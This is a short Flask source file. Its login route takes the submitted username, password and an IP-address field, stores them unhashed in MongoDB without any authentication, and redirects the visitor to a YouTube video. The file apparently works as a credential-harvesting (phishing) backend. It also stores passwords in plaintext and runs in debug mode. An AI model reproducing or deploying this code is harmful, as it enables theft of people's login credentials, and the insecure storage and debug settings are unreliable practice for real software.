from flask import Flask, render_template, request,redirect
from pymongo import MongoClient

app = Flask(__name__, static_url_path='/static')

client = MongoClient('mongodb://localhost:27017/')
db = client['users_db']

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = request.form['ip-address']
        
        user = {'username': username, 'password': password,'ip-address':ip_address}
        users_collection = db['users']
        result = users_collection.insert_one(user)
        return redirect('https://www.youtube.com/watch?v=9VqlFDL06C0')
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
